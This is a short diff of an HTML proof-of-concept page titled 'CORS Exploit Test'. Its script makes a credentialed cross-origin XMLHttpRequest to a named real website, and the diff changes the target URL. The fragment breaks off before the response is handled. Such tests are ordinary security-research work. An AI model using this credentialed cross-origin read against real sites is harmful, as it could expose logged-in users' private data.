@@ -4,7 +4,7 @@
 <h1>CORS Exploit Test (XMLHttpRequest)</h1>
 <script>
 var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://freizeit.sbb.ch/en/map/7fNskU9xznWE4n47rquYtE', true);
+xhr.open('GET', 'https://freizeit.sbb.ch', true);
 xhr.withCredentials = true;
 xhr.onreadystatechange = function() {
   if (xhr.readyState == 4) {
